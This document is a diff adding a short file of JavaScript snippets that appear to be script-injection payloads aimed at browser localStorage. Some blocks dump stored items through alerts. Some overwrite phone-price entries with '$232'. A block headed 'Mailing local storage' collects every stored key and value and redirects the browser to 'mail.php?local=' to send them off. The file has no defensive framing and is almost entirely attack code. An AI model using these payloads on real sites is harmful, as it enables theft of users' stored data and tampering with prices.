@@ -1,0 +1,81 @@
+if(localStorage.length){ 
+ console.log("total items count : " + localStorage.length); 
+ for(i in localStorage){ 
+ console.log(i + " : " + localStorage.getItem(i)); 
+ } 
+} 
+
+if(localStorage.length){ 
+ alert("Total no. of local storage items : " + localStorage.length); 
+} 
+
+//pop up script
+
+<script>
+
+for(i in localStorage){ 
+ alert(i + " : " + localStorage.getItem(i)); 
+ } 
+</script>
+
+
+//set value
+<script>
+
+localStorage["Micromax"] = "$232"; 
+
+</script>
+
+
+
+
+
+
+
+//Mailing local storage
+
+
+<script>
+
+var storage="";
+
+for(i in localStorage){ 
+ storage += i + " : " + localStorage.getItem(i) + ", \r\n "; 
+ } 
+
+ window.location.href = "mail.php?local=" + storage;
+
+</script>
+
+
+
+
+
+********************************************************
+
+//pop up script
+
+
+
+for(i in localStorage){ 
+ alert(i + " : " + localStorage.getItem(i)); 
+ } 
+
+
+localStorage["Micromax"] = "$232"; 
+localStorage["Moto G"] = "$232"; 
+localStorage["Google Nexus"] = "$232"; 
+localStorage["Nokia Lumia"] = "$232"; 
+localStorage["Samsung Galaxy S5"] = "$232"; 
+
+
+
+
+
+
+
+
+
+
+
+
